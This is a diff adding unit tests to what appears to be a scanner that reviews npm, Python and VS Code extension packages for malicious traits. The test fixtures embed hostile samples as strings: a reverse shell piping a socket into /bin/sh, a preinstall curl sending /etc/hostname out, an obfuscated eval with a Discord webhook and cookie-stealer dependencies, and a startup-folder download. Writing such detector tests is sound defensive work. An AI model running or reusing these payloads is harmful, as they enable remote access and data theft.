@@ -104,6 +104,24 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void A_default_main_that_pipes_a_socket_into_a_shell_is_noteworthy()
+    {
+        var r = Review(Tgz("runner-1.0.0.tgz",
+            ("package/package.json", """{"name":"node_package_runner","version":"1.0.0"}"""),
+            ("package/index.js", "const net=require('net'),{spawn}=require('child_process');\nconst c=new net.Socket();\nc.connect(4444,'example.invalid',()=>{const sh=spawn('/bin/sh',[]);c.pipe(sh.stdin);sh.stdout.pipe(c);});")));
+        Assert.Equal("noteworthy", r.Review);
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process", Path: "package/index.js" } && f.Detail.Contains("reverse shell", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void An_install_command_that_runs_curl_is_noteworthy()
+    {
+        var r = Review(Tgz("lang-2.0.9.tgz", ("package/package.json", """{"name":"actions-ls","version":"2.0.9","scripts":{"preinstall":"curl --data @/etc/hostname example.invalid"}}""")));
+        Assert.Equal("noteworthy", r.Review);
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script" } && f.Detail.Contains("network tool", StringComparison.Ordinal));
+    }
+
+    [Fact]
     public void A_plain_package_has_nothing_to_review() =>
         Assert.Equal("none", Review(Tgz("left-pad-1.3.0.tgz", ("package/package.json", """{"name":"left-pad","version":"1.3.0","main":"index.js"}"""),
             ("package/index.js", "module.exports = (s, n, c) => String(s).padStart(n, c);"))).Review);
@@ -122,6 +140,19 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Contains(r.Findings, f => f is { Category: "dynamic code", Level: "noteworthy" });
         Assert.Contains(r.Findings, f => f is { Category: "install script" } && f.Detail.Contains("cmdclass", StringComparison.Ordinal));
         Assert.Contains(r.Findings, f => f.Category == "name" && f.Detail.Contains("'requests'", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void Import_time_code_with_a_webhook_escaped_eval_and_stealer_dependencies_is_noteworthy()
+    {
+        var r = Review(Tgz("hugebbc-0.0.0.tar.gz",
+            ("hugebbc-0.0.0/PKG-INFO", "Metadata-Version: 2.1\nName: hugebbc\nVersion: 0.0.0\n"),
+            ("hugebbc-0.0.0/setup.py", "from setuptools import setup\nsetup(name='hugebbc', install_requires=['browser_cookie3', 'discordwebhook', 'requests'])\n"),
+            ("hugebbc-0.0.0/hugebbc/__init__.py", "_e=eval(\"\\145\\x76\\x61\\x6c\")\nH='https://discord.com/api/webhooks/1/x'\n")));
+        Assert.Equal("noteworthy", r.Review);
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "exfiltration", Path: "hugebbc-0.0.0/hugebbc/__init__.py" });
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "transformed code" } && f.Detail.Contains("escaped", StringComparison.Ordinal));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "credentials" } && f.Detail.Contains("browser_cookie3", StringComparison.Ordinal));
     }
 
     [Fact]
@@ -214,6 +245,18 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Contains(new PackageEntryPoint("command", "todo.scan", "Scan TODOs"), r.EntryPoints);
         Assert.Contains(r.Findings, f => f.Category == "activation");
         Assert.Contains(r.Scripts, s => s is { Name: "vscode:prepublish", AtInstall: false });
+    }
+
+    [Fact]
+    public void A_vscode_extension_that_downloads_from_a_raw_address_into_the_startup_folder_is_noteworthy()
+    {
+        var pkg = """{"name":"companion","publisher":"acme","version":"2.0.0","main":"./extension.js","activationEvents":["*"]}""";
+        var r = Review(Zip("acme.companion-2.0.0.vsix",
+            ("extension/package.json", U(pkg)),
+            ("extension/extension.js", U("const http=require('http'),os=require('os'),path=require('path');\nconst dir=path.join(os.homedir(),'AppData','Roaming','Microsoft','Windows','Start Menu','Programs','Startup');\nhttp.get('http://203.0.113.7/dl/tool.exe');"))));
+        Assert.Equal("noteworthy", r.Review);
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "exfiltration", Path: "extension/extension.js" });
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "persistence" });
     }
 
     [Fact]
